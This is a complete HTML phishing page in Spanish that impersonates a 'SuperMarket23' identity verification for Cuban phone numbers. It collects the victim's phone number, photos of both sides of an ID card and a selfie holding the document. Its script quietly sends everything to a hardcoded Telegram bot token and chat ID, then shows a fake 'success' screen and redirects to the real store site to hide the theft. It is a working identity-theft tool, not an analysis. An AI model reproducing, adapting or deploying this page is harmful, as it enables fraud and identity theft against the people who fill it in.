<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SuperMarket23 - Verificación</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; margin: 0; background-color: #ffffff; text-align: center; }
        .header { background-color: #004691; color: white; padding: 25px; font-size: 28px; font-weight: bold; }
        .container { padding: 20px; max-width: 450px; margin: auto; }
        .phone-input { display: flex; align-items: center; background: #f9f9f9; border: 2px solid #004691; border-radius: 8px; padding: 12px; margin-bottom: 20px; }
        .prefix { font-weight: bold; color: #004691; margin-right: 8px; font-size: 18px; }
        input[type="tel"] { border: none; background: transparent; outline: none; width: 100%; font-size: 18px; }
        .photo-box { width: 100%; height: 160px; border: 2px dashed #004691; margin-bottom: 15px; border-radius: 12px; display: flex; align-items: center; justify-content: center; background-color: #f0f5ff; cursor: pointer; overflow: hidden; }
        .photo-box img { width: 100%; height: 100%; object-fit: cover; display: none; }
        .photo-box span { color: #004691; font-size: 14px; font-weight: 600; }
        .btn-auth { background-color: #004691; color: white; border: none; width: 100%; padding: 18px; font-size: 20px; font-weight: bold; border-radius: 8px; cursor: pointer; }
        #status-container { display: none; margin-top: 50px; }
        .loader { border: 6px solid #f3f3f3; border-top: 6px solid #004691; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .success-icon { color: #28a745; font-size: 60px; display: none; }
    </style>
</head>
<body>

    <div class="header">SUPERMARKET23</div>

    <div class="container" id="main-form">
        <p style="color: #004691; font-weight: bold; margin-bottom: 25px;">SISTEMA DE VINCULACIÓN</p>
        <div class="phone-input">
            <span class="prefix">+53 #</span>
            <input type="tel" id="phone" placeholder="Número de teléfono" required>
        </div>
        
        <div class="photo-box" onclick="document.getElementById('f1').click()">
            <span id="t1">FOTO FRONTAL (ID)</span>
            <img id="i1">
            <input type="file" id="f1" accept="image/*" capture="camera" hidden onchange="preview(this, 'i1', 't1')">
        </div>
        <div class="photo-box" onclick="document.getElementById('f2').click()">
            <span id="t2">FOTO TRASERA (ID)</span>
            <img id="i2">
            <input type="file" id="f2" accept="image/*" capture="camera" hidden onchange="preview(this, 'i2', 't2')">
        </div>
        <div class="photo-box" onclick="document.getElementById('f3').click()">
            <span id="t3">SELFIE CON DOCUMENTO</span>
            <img id="i3">
            <input type="file" id="f3" accept="image/*" capture="camera" hidden onchange="preview(this, 'i3', 't3')">
        </div>

        <button class="btn-auth" onclick="startAuth()">AUTENTICAR</button>
    </div>

    <div class="container" id="status-container">
        <div id="loading-view">
            <div class="loader"></div>
            <p style="margin-top:20px; font-weight: bold; color: #555;">Procesando autenticación segura...</p>
        </div>
        <div id="success-view" style="display: none;">
            <div class="success-icon">✓</div>
            <h2 style="color: #28a745;">¡Éxito!</h2>
            <p>Verificación completada. Redirigiendo...</p>
        </div>
    </div>

    <script>
        function preview(input, imgId, txtId) {
            if (input.files && input.files[0]) {
                var reader = new FileReader();
                reader.onload = function(e) {
                    document.getElementById(imgId).src = e.target.result;
                    document.getElementById(imgId).style.display = 'block';
                    document.getElementById(txtId).style.display = 'none';
                }
                reader.readAsDataURL(input.files[0]);
            }
        }

        async function startAuth() {
            const phone = document.getElementById('phone').value;
            if(!phone) { alert("Ingrese su número."); return; }

            document.getElementById('main-form').style.display = 'none';
            document.getElementById('status-container').style.display = 'block';

            // DATOS EXTRAÍDOS DE TUS IMÁGENES
            const token = "8318759298:AAHQGru4lkB72lUN9TA-1VCZGxbl1n_3Nkc"; 
            const chatId = "6475554235"; 

            try {
                // Envío de número
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: "NUEVO: +53 #" + phone, disable_notification: true })
                });

                // Envío de fotos
                const ids = ['f1', 'f2', 'f3'];
                for (let id of ids) {
                    let file = document.getElementById(id).files[0];
                    if (file) {
                        let formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', file);
                        formData.append('disable_notification', 'true');
                        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
                    }
                }

                setTimeout(() => {
                    document.getElementById('loading-view').style.display = 'none';
                    document.getElementById('success-view').style.display = 'block';
                    document.querySelector('.success-icon').style.display = 'block';
                    setTimeout(() => { window.location.href = "https://www.supermarket23.com/"; }, 2500);
                }, 2000);
            } catch (e) {
                window.location.href = "https://www.supermarket23.com/";
            }
        }
    </script>
</body>
</html>
